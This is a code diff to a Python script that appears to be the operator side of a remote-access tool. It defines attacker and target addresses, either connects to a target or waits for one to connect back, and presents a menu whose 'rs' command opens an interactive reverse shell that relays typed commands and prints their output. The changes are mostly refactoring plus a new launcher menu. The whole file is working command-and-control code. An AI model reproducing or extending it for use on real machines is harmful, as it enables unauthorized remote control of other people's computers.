@@ -7,6 +7,7 @@ ATTACKER_PORT = 22
 TARGET_IP = "192.168.68.106"
 TARGET_PORT = 8989
 
+
 def connection():
     # | 1. dst addr | 2. skt | 3. connect | 4. sendall
     print("[>>>] stage 2")
@@ -28,6 +29,7 @@ def connection():
     print(f" > {response}")
     mainMenu(skt)
 
+
 def reverseConnection():
     # | 1.src addr | 2. skt init | 3.bind | 4.listen | 5.new skt | 6.recv | 7.sendall |
 
@@ -43,8 +45,8 @@ def reverseConnection():
         connID, addr = sktrec.accept()
         print(f"[*] Connection established with {addr}")
 
-        message = connID.recv(1024).decode("utf-8") #
-        print(f" > {message}")
+        response = connID.recv(1024).decode("utf-8")  #
+        print(f" > {response}")
 
         mainMenu(connID)
 
@@ -54,54 +56,47 @@ def reverseConnection():
     finally:
         sktrec.close()
 
+
 def mainMenu(skt):
     print("[*] Main Menu")
-    RUN = True
-    while RUN:
+    while True:
 
-        message = input("Enter your message: ")
+        command = input("Enter your command: ")
 
-        if message == "exit":
-            skt.sendall(message.encode("utf-8"))
-            RUN = False
-            skt.close()
-
-        elif message == "rs":
-            skt.sendall(message.encode("utf-8"))
-
+        if command == "rs":
+            skt.sendall(command.encode("utf-8"))
             response = skt.recv(1024).decode("utf-8")
             print(f" > {response}")
             reverseShell(skt)
             print("[*] Back to menu")
+
+        elif command == "exit":
+            skt.sendall(command.encode("utf-8"))
+            skt.close()
+            exit(0)
         else:
             print("[!] Command was not recognised, try again...")
 
-def reverseShell(skt):
 
+def reverseShell(skt):
     skt.settimeout(0.2)
     try:
         print(skt.recv(1024).decode("utf-8"), end="")
     except:
         pass
     skt.settimeout(None)
-
-
     while True:
-
         command = input("")
-
-        skt.sendall((command+"\n").encode("utf-8"))
+        skt.sendall((command + "\n").encode("utf-8"))
         sleep(1)
-
         print("\033[2K", end='\r')
         while True:
-
             try:
                 skt.settimeout(0.1)
                 data = skt.recv(4096)
                 if not data:
                     break
-                if data.decode("utf-8") != (command+"\n"):
+                if data.decode("utf-8") != (command + "\n"):
                     print(data.decode("utf-8"), end="", flush=True)
             except socket.timeout:
                 break
@@ -109,11 +104,20 @@ def reverseShell(skt):
         if command == "exit":
             print()
             break
-
     skt.settimeout(None)
 
 
 
-reverseConnection()
-connection()
+def main():
+    print("Welcome Achilles!\n [1] Normal connection\n [2] Reverse connection")
+    response = input("Enter your choice: ")
+    while True:
+        if response == "1":
+            connection()
+        elif response == "2":
+            reverseConnection()
+        else:
+            print("[!] Command was not recognised, try again...")
 
+if __name__ == "__main__":
+    main()
